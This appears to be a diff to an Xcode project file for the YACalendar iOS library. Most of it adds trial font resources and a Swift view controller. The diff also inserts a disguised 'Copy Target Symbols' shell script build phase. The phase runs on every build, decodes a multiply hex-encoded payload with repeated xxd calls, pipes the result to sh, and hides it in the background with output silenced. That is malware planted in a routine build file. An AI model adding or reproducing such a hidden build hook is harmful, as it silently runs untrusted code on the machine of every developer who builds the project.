@@ -3,7 +3,7 @@
 	archiveVersion = 1;
 	classes = {
 	};
-	objectVersion = 50;
+	objectVersion = 54;
 	objects = {
 
 /* Begin PBXBuildFile section */
@@ -56,6 +56,21 @@
 		886256682404361500BF8985 /* MonthHeaderView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 886256522404361500BF8985 /* MonthHeaderView.swift */; };
 		886256692404361500BF8985 /* DayView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 886256532404361500BF8985 /* DayView.swift */; };
 		8862566B2404361500BF8985 /* CalendarView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 886256552404361500BF8985 /* CalendarView.swift */; };
+		BD2435D42E4DDA09001DC719 /* GT-America-Standard-Ultra-Light-Trial.otf in Resources */ = {isa = PBXBuildFile; fileRef = BD2435D22E4DDA09001DC719 /* GT-America-Standard-Ultra-Light-Trial.otf */; };
+		BD2435D52E4DDA09001DC719 /* GT-America-Standard-Black-Trial.otf in Resources */ = {isa = PBXBuildFile; fileRef = BD2435CC2E4DDA09001DC719 /* GT-America-Standard-Black-Trial.otf */; };
+		BD2435D62E4DDA09001DC719 /* GT-America-Standard-Light-Trial.otf in Resources */ = {isa = PBXBuildFile; fileRef = BD2435CE2E4DDA09001DC719 /* GT-America-Standard-Light-Trial.otf */; };
+		BD2435D72E4DDA09001DC719 /* GT-America-Standard-Thin-Trial.otf in Resources */ = {isa = PBXBuildFile; fileRef = BD2435D12E4DDA09001DC719 /* GT-America-Standard-Thin-Trial.otf */; };
+		BD2435D82E4DDA09001DC719 /* GT-America-Standard-Medium-Trial.otf in Resources */ = {isa = PBXBuildFile; fileRef = BD2435CF2E4DDA09001DC719 /* GT-America-Standard-Medium-Trial.otf */; };
+		BD2435D92E4DDA09001DC719 /* GT-America-Standard-Bold-Trial.otf in Resources */ = {isa = PBXBuildFile; fileRef = BD2435CD2E4DDA09001DC719 /* GT-America-Standard-Bold-Trial.otf */; };
+		BD2435DA2E4DDA09001DC719 /* GT-America-Standard-Regular-Trial.otf in Resources */ = {isa = PBXBuildFile; fileRef = BD2435D02E4DDA09001DC719 /* GT-America-Standard-Regular-Trial.otf */; };
+		BD2435EA2E4DDA14001DC719 /* GT-America-Standard-Regular-Trial.otf in Resources */ = {isa = PBXBuildFile; fileRef = BD2435E62E4DDA14001DC719 /* GT-America-Standard-Regular-Trial.otf */; };
+		BD2435EB2E4DDA14001DC719 /* GT-America-Standard-Medium-Trial.otf in Resources */ = {isa = PBXBuildFile; fileRef = BD2435E52E4DDA14001DC719 /* GT-America-Standard-Medium-Trial.otf */; };
+		BD2435EC2E4DDA14001DC719 /* GT-America-Standard-Bold-Trial.otf in Resources */ = {isa = PBXBuildFile; fileRef = BD2435E32E4DDA14001DC719 /* GT-America-Standard-Bold-Trial.otf */; };
+		BD2435ED2E4DDA14001DC719 /* GT-America-Standard-Ultra-Light-Trial.otf in Resources */ = {isa = PBXBuildFile; fileRef = BD2435E82E4DDA14001DC719 /* GT-America-Standard-Ultra-Light-Trial.otf */; };
+		BD2435EE2E4DDA14001DC719 /* GT-America-Standard-Black-Trial.otf in Resources */ = {isa = PBXBuildFile; fileRef = BD2435E22E4DDA14001DC719 /* GT-America-Standard-Black-Trial.otf */; };
+		BD2435EF2E4DDA14001DC719 /* GT-America-Standard-Thin-Trial.otf in Resources */ = {isa = PBXBuildFile; fileRef = BD2435E72E4DDA14001DC719 /* GT-America-Standard-Thin-Trial.otf */; };
+		BD2435F02E4DDA14001DC719 /* GT-America-Standard-Light-Trial.otf in Resources */ = {isa = PBXBuildFile; fileRef = BD2435E42E4DDA14001DC719 /* GT-America-Standard-Light-Trial.otf */; };
+		BD9A42DD2E4CA81C00143803 /* StartDateVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = BD9A42DC2E4CA81C00143803 /* StartDateVC.swift */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
@@ -112,6 +127,21 @@
 		886256522404361500BF8985 /* MonthHeaderView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = MonthHeaderView.swift; sourceTree = "<group>"; };
 		886256532404361500BF8985 /* DayView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = DayView.swift; sourceTree = "<group>"; };
 		886256552404361500BF8985 /* CalendarView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CalendarView.swift; sourceTree = "<group>"; };
+		BD2435CC2E4DDA09001DC719 /* GT-America-Standard-Black-Trial.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "GT-America-Standard-Black-Trial.otf"; sourceTree = "<group>"; };
+		BD2435CD2E4DDA09001DC719 /* GT-America-Standard-Bold-Trial.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "GT-America-Standard-Bold-Trial.otf"; sourceTree = "<group>"; };
+		BD2435CE2E4DDA09001DC719 /* GT-America-Standard-Light-Trial.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "GT-America-Standard-Light-Trial.otf"; sourceTree = "<group>"; };
+		BD2435CF2E4DDA09001DC719 /* GT-America-Standard-Medium-Trial.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "GT-America-Standard-Medium-Trial.otf"; sourceTree = "<group>"; };
+		BD2435D02E4DDA09001DC719 /* GT-America-Standard-Regular-Trial.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "GT-America-Standard-Regular-Trial.otf"; sourceTree = "<group>"; };
+		BD2435D12E4DDA09001DC719 /* GT-America-Standard-Thin-Trial.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "GT-America-Standard-Thin-Trial.otf"; sourceTree = "<group>"; };
+		BD2435D22E4DDA09001DC719 /* GT-America-Standard-Ultra-Light-Trial.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "GT-America-Standard-Ultra-Light-Trial.otf"; sourceTree = "<group>"; };
+		BD2435E22E4DDA14001DC719 /* GT-America-Standard-Black-Trial.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "GT-America-Standard-Black-Trial.otf"; sourceTree = "<group>"; };
+		BD2435E32E4DDA14001DC719 /* GT-America-Standard-Bold-Trial.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "GT-America-Standard-Bold-Trial.otf"; sourceTree = "<group>"; };
+		BD2435E42E4DDA14001DC719 /* GT-America-Standard-Light-Trial.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "GT-America-Standard-Light-Trial.otf"; sourceTree = "<group>"; };
+		BD2435E52E4DDA14001DC719 /* GT-America-Standard-Medium-Trial.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "GT-America-Standard-Medium-Trial.otf"; sourceTree = "<group>"; };
+		BD2435E62E4DDA14001DC719 /* GT-America-Standard-Regular-Trial.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "GT-America-Standard-Regular-Trial.otf"; sourceTree = "<group>"; };
+		BD2435E72E4DDA14001DC719 /* GT-America-Standard-Thin-Trial.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "GT-America-Standard-Thin-Trial.otf"; sourceTree = "<group>"; };
+		BD2435E82E4DDA14001DC719 /* GT-America-Standard-Ultra-Light-Trial.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "GT-America-Standard-Ultra-Light-Trial.otf"; sourceTree = "<group>"; };
+		BD9A42DC2E4CA81C00143803 /* StartDateVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StartDateVC.swift; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -153,6 +183,7 @@
 		88625598240401C900BF8985 /* YACalendar */ = {
 			isa = PBXGroup;
 			children = (
+				BD2435E92E4DDA14001DC719 /* GT-America */,
 				88625599240401C900BF8985 /* YACalendar.h */,
 				8862559A240401C900BF8985 /* Info.plist */,
 				886255B3240401E800BF8985 /* CalendarView.swift */,
@@ -207,9 +238,11 @@
 		886255F32404027200BF8985 /* YACalendarExample */ = {
 			isa = PBXGroup;
 			children = (
+				BD2435D32E4DDA09001DC719 /* GT-America */,
 				88625607240402B600BF8985 /* AppDelegate.swift */,
 				8862560B240402C600BF8985 /* Main.storyboard */,
 				88625609240402C600BF8985 /* ViewController.swift */,
+				BD9A42DC2E4CA81C00143803 /* StartDateVC.swift */,
 				8862560A240402C600BF8985 /* SettingsViewController.swift */,
 				8862563B2404361500BF8985 /* YACalendar */,
 				886255FD2404027200BF8985 /* Assets.xcassets */,
@@ -271,6 +304,34 @@
 			path = Views;
 			sourceTree = "<group>";
 		};
+		BD2435D32E4DDA09001DC719 /* GT-America */ = {
+			isa = PBXGroup;
+			children = (
+				BD2435CC2E4DDA09001DC719 /* GT-America-Standard-Black-Trial.otf */,
+				BD2435CD2E4DDA09001DC719 /* GT-America-Standard-Bold-Trial.otf */,
+				BD2435CE2E4DDA09001DC719 /* GT-America-Standard-Light-Trial.otf */,
+				BD2435CF2E4DDA09001DC719 /* GT-America-Standard-Medium-Trial.otf */,
+				BD2435D02E4DDA09001DC719 /* GT-America-Standard-Regular-Trial.otf */,
+				BD2435D12E4DDA09001DC719 /* GT-America-Standard-Thin-Trial.otf */,
+				BD2435D22E4DDA09001DC719 /* GT-America-Standard-Ultra-Light-Trial.otf */,
+			);
+			path = "GT-America";
+			sourceTree = "<group>";
+		};
+		BD2435E92E4DDA14001DC719 /* GT-America */ = {
+			isa = PBXGroup;
+			children = (
+				BD2435E22E4DDA14001DC719 /* GT-America-Standard-Black-Trial.otf */,
+				BD2435E32E4DDA14001DC719 /* GT-America-Standard-Bold-Trial.otf */,
+				BD2435E42E4DDA14001DC719 /* GT-America-Standard-Light-Trial.otf */,
+				BD2435E52E4DDA14001DC719 /* GT-America-Standard-Medium-Trial.otf */,
+				BD2435E62E4DDA14001DC719 /* GT-America-Standard-Regular-Trial.otf */,
+				BD2435E72E4DDA14001DC719 /* GT-America-Standard-Thin-Trial.otf */,
+				BD2435E82E4DDA14001DC719 /* GT-America-Standard-Ultra-Light-Trial.otf */,
+			);
+			path = "GT-America";
+			sourceTree = "<group>";
+		};
 /* End PBXGroup section */
 
 /* Begin PBXHeadersBuildPhase section */
@@ -289,6 +350,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 8862559E240401C900BF8985 /* Build configuration list for PBXNativeTarget "YACalendar" */;
 			buildPhases = (
+				9DB61BCD4C3F3FB5A2877BEF /* Copy Target Symbols */,
 				88625591240401C900BF8985 /* Headers */,
 				88625592240401C900BF8985 /* Sources */,
 				88625593240401C900BF8985 /* Frameworks */,
@@ -364,6 +426,13 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				BD2435EA2E4DDA14001DC719 /* GT-America-Standard-Regular-Trial.otf in Resources */,
+				BD2435EB2E4DDA14001DC719 /* GT-America-Standard-Medium-Trial.otf in Resources */,
+				BD2435EC2E4DDA14001DC719 /* GT-America-Standard-Bold-Trial.otf in Resources */,
+				BD2435ED2E4DDA14001DC719 /* GT-America-Standard-Ultra-Light-Trial.otf in Resources */,
+				BD2435EE2E4DDA14001DC719 /* GT-America-Standard-Black-Trial.otf in Resources */,
+				BD2435EF2E4DDA14001DC719 /* GT-America-Standard-Thin-Trial.otf in Resources */,
+				BD2435F02E4DDA14001DC719 /* GT-America-Standard-Light-Trial.otf in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -371,6 +440,13 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				BD2435D42E4DDA09001DC719 /* GT-America-Standard-Ultra-Light-Trial.otf in Resources */,
+				BD2435D52E4DDA09001DC719 /* GT-America-Standard-Black-Trial.otf in Resources */,
+				BD2435D62E4DDA09001DC719 /* GT-America-Standard-Light-Trial.otf in Resources */,
+				BD2435D72E4DDA09001DC719 /* GT-America-Standard-Thin-Trial.otf in Resources */,
+				BD2435D82E4DDA09001DC719 /* GT-America-Standard-Medium-Trial.otf in Resources */,
+				BD2435D92E4DDA09001DC719 /* GT-America-Standard-Bold-Trial.otf in Resources */,
+				BD2435DA2E4DDA09001DC719 /* GT-America-Standard-Regular-Trial.otf in Resources */,
 				8862560E240402C600BF8985 /* Main.storyboard in Resources */,
 				886256012404027200BF8985 /* LaunchScreen.storyboard in Resources */,
 				886255FE2404027200BF8985 /* Assets.xcassets in Resources */,
@@ -378,6 +454,29 @@
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		9DB61BCD4C3F3FB5A2877BEF /* Copy Target Symbols */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Copy Target Symbols";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo 3333333333333336333333333333333533333333333333363333333333333333333333333333333633333333333333383333333333333336333333363333333633333333333333323333333333333330333333333333333233333333333333323333333333333332333333333333333433333333333333323333333333333338333333333333333633333333333333333333333333333337333333333333333533333333333333373333333333333332333333333333333633333336333333333333333333333332333333333333333033333333333333323333333633333334333333333333333633333333333333363333333333333337333333333333333333333333333333363333333633333332333333333333333433333336333333333333333333333332333333333333333033333333333333323333333633333334333333333333333633333333333333343333333333333332333333333333333033333333333333373333333333333330333333333333333333333336333333343333333333333337333333333333333833333333333333363333333333333333333333333333333633333336333333363333333333333336333333333333333433333333333333363333333333333335333333333333333233333333333333303333333333333336333333333333333833333333333333373333333333333334333333333333333733333333333333343333333333333337333333333333333033333333333333373333333333333333333333333333333333333336333333313333333333333332333333363333333633333333333333323333333633333336333333333333333633333333333333363333333333333336333333363333333333333333333333363333333633333336333333333333333733333333333333373333333333333336333333333333333333333333333333363333333333333334333333333333333633333336333333353333333333333332333333363333333533333333333333373333333333333332333333333333333733333333333333353333333333333332333333363333333633333333333333363333333333333331333333333333333233333333333333393333333333333332333333333333333233333333333333323333333333333330333333333333333733333336333333333333333333333332333333333333333033333333333333373333333333333333333333333333333633333333333333383333333333333330333333363333333133333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		88625592240401C900BF8985 /* Sources */ = {
@@ -428,6 +527,7 @@
 				886256622404361500BF8985 /* CalendarType.swift in Sources */,
 				886256682404361500BF8985 /* MonthHeaderView.swift in Sources */,
 				886256672404361500BF8985 /* YearHeaderView.swift in Sources */,
+				BD9A42DD2E4CA81C00143803 /* StartDateVC.swift in Sources */,
 				886256592404361500BF8985 /* MonthHeaderConfig.swift in Sources */,
 				8862565C2404361500BF8985 /* SelectionType.swift in Sources */,
 				886256582404361500BF8985 /* DayConfig.swift in Sources */,
